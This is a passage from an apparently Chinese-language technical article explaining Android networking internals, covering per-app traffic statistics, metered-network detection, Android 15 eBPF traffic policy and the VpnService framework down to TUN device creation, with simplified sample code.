        <span class="hljs-type">long</span> <span class="hljs-variable">rxPackets</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxPackets(uid);

        <span class="hljs-comment">// 4. 获取发送数据包数</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">txPackets</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxPackets(uid);

        Log.d(TAG, String.format(
            <span class="hljs-string">"UID %d: RX=%s TX=%s"</span>,
            uid,
            humanReadableByteCount(rxBytes),
            humanReadableByteCount(txBytes)
        ));
    }

    <span class="hljs-comment">// 标记Socket (用于细粒度统计)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tagSocket</span><span class="hljs-params">(Socket socket, <span class="hljs-type">int</span> tag)</span> {
        <span class="hljs-comment">// 设置线程的流量标签</span>
        TrafficStats.setThreadStatsTag(tag);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 标记Socket</span>
            TrafficStats.tagSocket(socket);

            <span class="hljs-comment">// 进行网络操作...</span>
            socket.connect(address);

        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// 取消标签</span>
            TrafficStats.untagSocket(socket);
            TrafficStats.clearThreadStatsTag();
        }
    }

    <span class="hljs-comment">// 格式化流量显示</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">humanReadableByteCount</span><span class="hljs-params">(<span class="hljs-type">long</span> bytes)</span> {
        <span class="hljs-keyword">if</span> (bytes &lt; <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> bytes + <span class="hljs-string">" B"</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (Math.log(bytes) / Math.log(<span class="hljs-number">1024</span>));
        <span class="hljs-type">char</span> <span class="hljs-variable">pre</span> <span class="hljs-operator">=</span> <span class="hljs-string">"KMGTPE"</span>.charAt(exp - <span class="hljs-number">1</span>);
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%.1f %sB"</span>,
                           bytes / Math.pow(<span class="hljs-number">1024</span>, exp), pre);
    }
}
</code></pre>
<h3 data-id="heading-13">1.4 按流量计费网络识别</h3>
<p>Android需要识别哪些网络是<strong>按流量计费</strong>的（Metered Network），以便应用优化行为。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// NetworkCapabilities中的能力标识</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkCapabilities</span> {
    <span class="hljs-comment">// 非计费网络（如家庭WiFi）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">NET_CAPABILITY_NOT_METERED</span> <span class="hljs-operator">=</span> <span class="hljs-number">11</span>;

    <span class="hljs-comment">// 临时非计费（如运营商免费流量）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">NET_CAPABILITY_TEMPORARILY_NOT_METERED</span> <span class="hljs-operator">=</span> <span class="hljs-number">25</span>;
}
</code></pre>
<h4 data-id="heading-14">识别逻辑</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ConnectivityService.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMeteredStatus</span><span class="hljs-params">(NetworkAgentInfo nai)</span> {
    <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">nc</span> <span class="hljs-operator">=</span> nai.networkCapabilities;

    <span class="hljs-comment">// 1. WiFi默认非计费</span>
    <span class="hljs-keyword">if</span> (nc.hasTransport(TRANSPORT_WIFI)) {
        nc.addCapability(NET_CAPABILITY_NOT_METERED);
    }

    <span class="hljs-comment">// 2. 移动网络默认计费</span>
    <span class="hljs-keyword">if</span> (nc.hasTransport(TRANSPORT_CELLULAR)) {
        nc.removeCapability(NET_CAPABILITY_NOT_METERED);
    }

    <span class="hljs-comment">// 3. 但可以被配置覆盖</span>
    <span class="hljs-keyword">if</span> (mNetworkPolicies.isNetworkMetered(nai)) {
        nc.removeCapability(NET_CAPABILITY_NOT_METERED);
    }
}
</code></pre>
<h4 data-id="heading-15">应用检查示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isCurrentNetworkMetered</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> (ConnectivityManager)
        context.getSystemService(Context.CONNECTIVITY_SERVICE);

    <span class="hljs-comment">// 1. 获取当前网络</span>
    <span class="hljs-type">Network</span> <span class="hljs-variable">network</span> <span class="hljs-operator">=</span> cm.getActiveNetwork();
    <span class="hljs-keyword">if</span> (network == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 安全起见，假设计费</span>

    <span class="hljs-comment">// 2. 获取能力</span>
    <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">capabilities</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(network);
    <span class="hljs-keyword">if</span> (capabilities == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;

    <span class="hljs-comment">// 3. 检查是否非计费</span>
    <span class="hljs-keyword">return</span> !capabilities.hasCapability(NET_CAPABILITY_NOT_METERED);
}
</code></pre>
<h3 data-id="heading-16">1.5 Android 15新特性：eBPF网络策略</h3>
<p>Android 15使用**eBPF (extended Berkeley Packet Filter)**替代传统的iptables，性能提升显著。</p>
<h4 data-id="heading-17">eBPF vs iptables对比</h4>



































<table><thead><tr><th align="left">特性</th><th align="left">iptables</th><th align="left">eBPF (Android 15)</th></tr></thead><tbody><tr><td align="left">规则匹配</td><td align="left">线性扫描 O(n)</td><td align="left">哈希查找 O(1)</td></tr><tr><td align="left">延迟</td><td align="left">~100μs</td><td align="left">~10μs</td></tr><tr><td align="left">内核态切换</td><td align="left">需要</td><td align="left">不需要</td></tr><tr><td align="left">动态更新</td><td align="left">锁全表</td><td align="left">无锁更新</td></tr><tr><td align="left">CPU占用</td><td align="left">高</td><td align="left">低</td></tr></tbody></table>
<h4 data-id="heading-18">eBPF实现原理</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// system/netd/bpf_progs/netd.c</span>

<span class="hljs-comment">// BPF程序 - UID流量控制</span>
SEC(<span class="hljs-string">"cgroupskb/ingress/stats"</span>)
<span class="hljs-type">int</span> <span class="hljs-title function_">bpf_traffic_account</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> __sk_buff *skb)</span> {
    <span class="hljs-comment">// 1. 获取UID</span>
    <span class="hljs-type">uint32_t</span> uid = bpf_get_socket_uid(skb);

    <span class="hljs-comment">// 2. 查询UID规则</span>
    <span class="hljs-type">uint8_t</span> *rule = bpf_uid_permission_map_lookup_elem(&amp;uid);

    <span class="hljs-comment">// 3. 检查权限</span>
    <span class="hljs-keyword">if</span> (rule &amp;&amp; (*rule &amp; BPF_PERMISSION_INTERNET) == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// 拒绝：丢弃数据包</span>
    }

    <span class="hljs-comment">// 4. 统计流量</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stats_value</span> *<span class="hljs-title">value</span> =</span> bpf_uid_stats_map_lookup_elem(&amp;uid);
    <span class="hljs-keyword">if</span> (value) {
        __sync_fetch_and_add(&amp;value-&gt;rxBytes, skb-&gt;len);
        __sync_fetch_and_add(&amp;value-&gt;rxPackets, <span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// 允许：继续传输</span>
}

<span class="hljs-comment">// BPF Map - UID权限表</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, <span class="hljs-type">uint32_t</span>);    <span class="hljs-comment">// UID</span>
    __type(value, <span class="hljs-type">uint8_t</span>);   <span class="hljs-comment">// 权限标志</span>
    __uint(max_entries, <span class="hljs-number">10000</span>);
} uid_permission_map <span class="hljs-title function_">SEC</span><span class="hljs-params">(<span class="hljs-string">".maps"</span>)</span>;

<span class="hljs-comment">// BPF Map - UID流量统计</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, <span class="hljs-type">uint32_t</span>);    <span class="hljs-comment">// UID</span>
    __type(value, <span class="hljs-keyword">struct</span> stats_value);
    __uint(max_entries, <span class="hljs-number">10000</span>);
} uid_stats_map <span class="hljs-title function_">SEC</span><span class="hljs-params">(<span class="hljs-string">".maps"</span>)</span>;
</code></pre>
<h4 data-id="heading-19">Java层接口</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// frameworks/base/.../BpfNetMaps.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BpfNetMaps</span> {

    <span class="hljs-comment">// 设置UID网络规则</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUidRule</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, <span class="hljs-type">int</span> rule)</span> {
        <span class="hljs-comment">// 直接更新BPF Map</span>
        mUidPermissionMap.updateEntry(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UidPermissionKey</span>(uid),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UidPermissionValue</span>(rule)
        );
    }

    <span class="hljs-comment">// 读取UID流量统计</span>
    <span class="hljs-keyword">public</span> NetworkStats <span class="hljs-title function_">readStatsForUid</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-type">UidStatsValue</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> mUidStatsMap.getValue(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UidStatsKey</span>(uid)
        );

        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkStats</span>.Entry(
            <span class="hljs-literal">null</span>, uid,
            SET_DEFAULT, TAG_NONE,
            METERED_NO, ROAMING_NO,
            DEFAULT_NETWORK_NO,
            value.rxBytes, value.rxPackets,
            value.txBytes, value.txPackets,
            <span class="hljs-number">0</span> <span class="hljs-comment">/* operations */</span>
        );
    }
}
</code></pre>
<p><strong>性能提升</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">测试场景: 1000个应用同时联网

iptables方式:
  - 规则匹配时间: 1000 * 100μ<span class="hljs-attr">s</span> = <span class="hljs-number">100</span>ms
  - CPU占用: 15%

eBPF方式:
  - 规则匹配时间: 1000 * 10μ<span class="hljs-attr">s</span> = <span class="hljs-number">10</span>ms
  - CPU占用: 3%

性能提升: 10倍延迟降低，5倍CPU减少
</code></pre>
<hr/>
<h2 data-id="heading-20">二、VPN框架深度解析</h2>
<h3 data-id="heading-21">2.1 VpnService架构总览</h3>
<p><strong>VPN (Virtual Private Network)</strong> 虚拟专用网络，在Android中通过<code>VpnService</code>框架实现。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a47ab27f9a0a462fb4d05f9536092add~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382913&amp;x-signature=oXivoQ02D3TSS5kHTUN4SKcVF0Q%3D" alt="08-02-vpn-workflow.png" loading="lazy"/></p>
<h4 data-id="heading-22">核心组件</h4>
<pre><code class="hljs language-bash" lang="bash">┌─────────────────────────────────────────┐
│          Android VPN架构                 │
├─────────────────────────────────────────┤
│                                         │
│  应用层                                  │
│  ┌────────────────┐                     │
│  │  VpnService    │ ← 应用继承实现      │
│  │  (抽象基类)     │                     │
│  └────────────────┘                     │
│         ↓                                │
│  ┌────────────────┐                     │
│  │  Builder       │ ← 配置VPN参数       │
│  └────────────────┘                     │
│                                         │
│  Framework层                             │
│  ┌────────────────┐                     │
│  │  Vpn.java      │ ← VPN管理核心       │
│  └────────────────┘                     │
│         ↓                                │
│  ┌────────────────┐                     │
│  │ConnectivitySrv │ ← 网络连接管理      │
│  └────────────────┘                     │
│                                         │
│  Native层                                │
│  ┌────────────────┐                     │
│  │  Netd          │ ← 路由配置          │
│  └────────────────┘                     │
│                                         │
│  Kernel层                                │
│  ┌────────────────┐                     │
│  │  TUN Driver    │ ← 虚拟网卡          │
│  │  /dev/tun      │                     │
│  └────────────────┘                     │
│                                         │
└─────────────────────────────────────────┘
</code></pre>
<h3 data-id="heading-23">2.2 VpnService应用层实现</h3>
<h4 data-id="heading-24">基础VPN示例</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 应用实现VPN服务</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyVpnService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">VpnService</span> {

    <span class="hljs-keyword">private</span> ParcelFileDescriptor mInterface;
    <span class="hljs-keyword">private</span> Thread mVpnThread;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">onStartCommand</span><span class="hljs-params">(Intent intent, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> startId)</span> {
        <span class="hljs-comment">// 1. 准备VPN (弹出用户授权对话框)</span>
        <span class="hljs-type">Intent</span> <span class="hljs-variable">prepare</span> <span class="hljs-operator">=</span> VpnService.prepare(<span class="hljs-built_in">this</span>);
        <span class="hljs-keyword">if</span> (prepare != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 需要用户授权</span>
            startActivity(prepare);
            <span class="hljs-keyword">return</span> START_NOT_STICKY;
        }

        <span class="hljs-comment">// 2. 建立VPN连接</span>
        mVpnThread = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-built_in">this</span>::setupVpn);
        mVpnThread.start();

        <span class="hljs-keyword">return</span> START_STICKY;
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setupVpn</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 3. 配置VPN参数</span>
            <span class="hljs-type">Builder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>();
            builder
                <span class="hljs-comment">// 设置VPN地址</span>
                .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)

                <span class="hljs-comment">// 设置路由 (所有流量通过VPN)</span>
                .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>)

                <span class="hljs-comment">// 设置DNS</span>
                .addDnsServer(<span class="hljs-string">"8.8.8.8"</span>)
                .addDnsServer(<span class="hljs-string">"8.8.4.4"</span>)

                <span class="hljs-comment">// 设置MTU</span>
                .setMtu(<span class="hljs-number">1500</span>)

                <span class="hljs-comment">// 设置会话名称</span>
                .setSession(<span class="hljs-string">"MyVPN"</span>)

                <span class="hljs-comment">// 配置允许/禁止的应用</span>
                .addAllowedApplication(<span class="hljs-string">"com.example.app"</span>)
                .addDisallowedApplication(<span class="hljs-string">"com.example.excluded"</span>);

            <span class="hljs-comment">// 4. 建立TUN接口</span>
            mInterface = builder.establish();
            <span class="hljs-keyword">if</span> (mInterface == <span class="hljs-literal">null</span>) {
                Log.e(TAG, <span class="hljs-string">"Failed to establish VPN"</span>);
                <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-comment">// 5. 获取文件描述符</span>
            <span class="hljs-type">FileDescriptor</span> <span class="hljs-variable">fd</span> <span class="hljs-operator">=</span> mInterface.getFileDescriptor();

            <span class="hljs-comment">// 6. 读写TUN设备</span>
            handleTraffic(fd);

        } <span class="hljs-keyword">catch</span> (Exception e) {
            Log.e(TAG, <span class="hljs-string">"VPN setup failed"</span>, e);
        }
    }

    <span class="hljs-comment">// 处理TUN设备流量</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTraffic</span><span class="hljs-params">(FileDescriptor fd)</span> {
        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(fd);
        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fd);

        <span class="hljs-type">byte</span>[] packet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">32767</span>];

        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// 1. 从TUN设备读取IP数据包</span>
                <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> in.read(packet);
                <span class="hljs-keyword">if</span> (length &gt; <span class="hljs-number">0</span>) {
                    <span class="hljs-comment">// 2. 解析IP包</span>
                    <span class="hljs-type">IpPacket</span> <span class="hljs-variable">ipPacket</span> <span class="hljs-operator">=</span> parseIpPacket(packet, length);

                    <span class="hljs-comment">// 3. 加密/封装数据</span>
                    <span class="hljs-type">byte</span>[] encrypted = encrypt(ipPacket);

                    <span class="hljs-comment">// 4. 发送到VPN服务器</span>
                    sendToVpnServer(encrypted);
                }

                <span class="hljs-comment">// 5. 从VPN服务器接收数据</span>
                <span class="hljs-type">byte</span>[] received = receiveFromVpnServer();
                <span class="hljs-keyword">if</span> (received != <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// 6. 解密/解封装</span>
                    <span class="hljs-type">byte</span>[] decrypted = decrypt(received);

                    <span class="hljs-comment">// 7. 写回TUN设备</span>
                    out.write(decrypted);
                }

            } <span class="hljs-keyword">catch</span> (IOException e) {
                <span class="hljs-keyword">break</span>;
            }
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDestroy</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (mVpnThread != <span class="hljs-literal">null</span>) {
            mVpnThread.interrupt();
        }
        <span class="hljs-keyword">if</span> (mInterface != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                mInterface.close();
            } <span class="hljs-keyword">catch</span> (IOException e) {
                <span class="hljs-comment">// Ignore</span>
            }
        }
        <span class="hljs-built_in">super</span>.onDestroy();
    }
}
</code></pre>
<h4 data-id="heading-25">VPN配置详解</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VpnConfigExample</span> {

    <span class="hljs-comment">// 配置1：全局VPN (所有流量)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupGlobalVpn</span><span class="hljs-params">(VpnService service)</span> {
        <span class="hljs-keyword">return</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>)      <span class="hljs-comment">// 所有IPv4流量</span>
            .addRoute(<span class="hljs-string">"::"</span>, <span class="hljs-number">0</span>)           <span class="hljs-comment">// 所有IPv6流量</span>
            .addDnsServer(<span class="hljs-string">"8.8.8.8"</span>)
            .establish();
    }

    <span class="hljs-comment">// 配置2：分流VPN (仅特定网段)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupSplitVpn</span><span class="hljs-params">(VpnService service)</span> {
        <span class="hljs-keyword">return</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"192.168.0.0"</span>, <span class="hljs-number">16</span>)   <span class="hljs-comment">// 仅企业内网</span>
            .addRoute(<span class="hljs-string">"10.0.0.0"</span>, <span class="hljs-number">8</span>)       <span class="hljs-comment">// 仅私有网络</span>
            .addDnsServer(<span class="hljs-string">"10.0.0.1"</span>)
            .establish();
    }

    <span class="hljs-comment">// 配置3：应用级VPN (仅特定应用)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupPerAppVpn</span><span class="hljs-params">(VpnService service)</span>
            <span class="hljs-keyword">throws</span> PackageManager.NameNotFoundException {
        <span class="hljs-type">Builder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>);

        <span class="hljs-comment">// 方式1：白名单模式 (只有指定应用走VPN)</span>
        builder.addAllowedApplication(<span class="hljs-string">"com.example.secure"</span>);
        builder.addAllowedApplication(<span class="hljs-string">"com.example.banking"</span>);

        <span class="hljs-comment">// 方式2：黑名单模式 (指定应用不走VPN)</span>
        <span class="hljs-comment">// builder.addDisallowedApplication("com.example.local");</span>

        <span class="hljs-keyword">return</span> builder.establish();
    }

    <span class="hljs-comment">// 配置4：Always-on VPN (系统级持久VPN)</span>
    <span class="hljs-keyword">public</span> ParcelFileDescriptor <span class="hljs-title function_">setupAlwaysOnVpn</span><span class="hljs-params">(VpnService service)</span> {
        <span class="hljs-keyword">return</span> service.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Builder</span>()
            .addAddress(<span class="hljs-string">"10.0.0.2"</span>, <span class="hljs-number">24</span>)
            .addRoute(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">0</span>)
            .addDnsServer(<span class="hljs-string">"8.8.8.8"</span>)
            .setBlocking(<span class="hljs-literal">true</span>)  <span class="hljs-comment">// 阻塞模式：VPN断开时阻止所有流量</span>
            .establish();
    }
}
</code></pre>
<h3 data-id="heading-26">2.3 Framework层VPN管理</h3>
<p><strong>源码位置</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">packages/modules/Connectivity/service/src/com/android/server/connectivity/Vpn.java
</code></pre>
<h4 data-id="heading-27">Vpn.java核心实现</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Vpn.java (简化版)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Vpn</span> {

    <span class="hljs-comment">// VPN配置</span>
    <span class="hljs-keyword">private</span> VpnConfig mConfig;

    <span class="hljs-comment">// TUN接口名称</span>
    <span class="hljs-keyword">private</span> String mInterface;

    <span class="hljs-comment">// VPN网络</span>
    <span class="hljs-keyword">private</span> Network mNetwork;

    <span class="hljs-comment">// VPN NetworkAgent</span>
    <span class="hljs-keyword">private</span> NetworkAgent mNetworkAgent;

    <span class="hljs-comment">// 核心方法：建立VPN</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> ParcelFileDescriptor <span class="hljs-title function_">establish</span><span class="hljs-params">(VpnConfig config)</span> {
        <span class="hljs-comment">// 1. 权限检查</span>
        enforceControlPermission();

        <span class="hljs-comment">// 2. 创建TUN设备</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">interfaceName</span> <span class="hljs-operator">=</span> jniCreate(config.mtu);
        <span class="hljs-keyword">if</span> (interfaceName == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"Failed to create TUN device"</span>);
        }
        mInterface = interfaceName;

        <span class="hljs-comment">// 3. 配置TUN设备地址</span>
        <span class="hljs-keyword">for</span> (LinkAddress address : config.addresses) {
            jniAddAddress(interfaceName, address.getAddress(),
                         address.getPrefixLength());
        }

        <span class="hljs-comment">// 4. 配置路由</span>
        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Connection</span>();
        connection.interfaceName = interfaceName;
        connection.routes = config.routes;

        <span class="hljs-comment">// 5. 通知Netd配置路由</span>
        <span class="hljs-keyword">try</span> {
            mNetd.addVpnUidRanges(mInterface, config.allowedUidRanges);

            <span class="hljs-keyword">for</span> (RouteInfo route : config.routes) {
                mNetd.vpnAddRoute(mInterface, route);
            }
        } <span class="hljs-keyword">catch</span> (RemoteException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"Netd error"</span>, e);
        }

        <span class="hljs-comment">// 6. 设置DNS</span>
        <span class="hljs-keyword">try</span> {
            mNetd.setDnsServersForInterface(interfaceName,
                                           config.dnsServers,
                                           config.searchDomains);
        } <span class="hljs-keyword">catch</span> (RemoteException e) {
            <span class="hljs-comment">// ...</span>
        }

        <span class="hljs-comment">// 7. 创建NetworkAgent</span>
        agentConnect(config);

        <span class="hljs-comment">// 8. 打开TUN设备文件描述符</span>
        <span class="hljs-type">ParcelFileDescriptor</span> <span class="hljs-variable">tun</span> <span class="hljs-operator">=</span> ParcelFileDescriptor.adoptFd(
            jniGetFd(interfaceName)
        );

        <span class="hljs-keyword">return</span> tun;
    }

    <span class="hljs-comment">// 创建NetworkAgent</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentConnect</span><span class="hljs-params">(VpnConfig config)</span> {
        <span class="hljs-comment">// 构建NetworkCapabilities</span>
        <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">caps</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkCapabilities</span>();
        caps.addTransportType(NetworkCapabilities.TRANSPORT_VPN);
        caps.removeCapability(NET_CAPABILITY_NOT_VPN);

        <span class="hljs-keyword">if</span> (config.allowBypass) {
            caps.addCapability(NET_CAPABILITY_NOT_RESTRICTED);
        }

        <span class="hljs-comment">// 构建LinkProperties</span>
        <span class="hljs-type">LinkProperties</span> <span class="hljs-variable">lp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkProperties</span>();
        lp.setInterfaceName(mInterface);

        <span class="hljs-comment">// 创建NetworkAgent</span>
        mNetworkAgent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkAgent</span>(mContext, mLooper,
            <span class="hljs-string">"VPN"</span>, caps, lp, <span class="hljs-number">0</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkAgentConfig</span>(), <span class="hljs-built_in">this</span>) {

            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onNetworkUnwanted</span><span class="hljs-params">()</span> {
                <span class="hljs-comment">// VPN被移除</span>
                Vpn.<span class="hljs-built_in">this</span>.onNetworkUnwanted();
            }
        };

        mNetworkAgent.register();
        mNetwork = mNetworkAgent.getNetwork();
    }

    <span class="hljs-comment">// JNI方法 - 创建TUN设备</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">jniCreate</span><span class="hljs-params">(<span class="hljs-type">int</span> mtu)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">jniGetName</span><span class="hljs-params">(<span class="hljs-type">int</span> tun)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">jniAddAddress</span><span class="hljs-params">(String interfaceName,
                                     String address, <span class="hljs-type">int</span> prefixLen)</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">native</span> <span class="hljs-type">int</span> <span class="hljs-title function_">jniGetFd</span><span class="hljs-params">(String interfaceName)</span>;
}
</code></pre>
<h4 data-id="heading-28">JNI层TUN设备操作</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// frameworks/base/core/jni/android_net_LocalSocketImpl.cpp</span>

<span class="hljs-function"><span class="hljs-type">static</span> jint <span class="hljs-title">com_android_server_connectivity_Vpn_jniCreate</span><span class="hljs-params">(JNIEnv* env,
                                                          jobject <span class="hljs-comment">/* clazz */</span>,
                                                          jint mtu)</span> </span>{
    <span class="hljs-comment">// 1. 打开TUN设备</span>
    <span class="hljs-type">int</span> tun = <span class="hljs-built_in">open</span>(<span class="hljs-string">"/dev/tun"</span>, O_RDWR | O_NONBLOCK | O_CLOEXEC);
    <span class="hljs-keyword">if</span> (tun &lt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">jniThrowException</span>(env, <span class="hljs-string">"java/io/IOException"</span>,
                         <span class="hljs-string">"Cannot open TUN device"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }

    <span class="hljs-comment">// 2. 配置TUN设备</span>
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ifreq</span> ifr;
    <span class="hljs-built_in">memset</span>(&amp;ifr, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(ifr));
    ifr.ifr_flags = IFF_TUN | IFF_NO_PI;  <span class="hljs-comment">// TUN模式，无协议头</span>
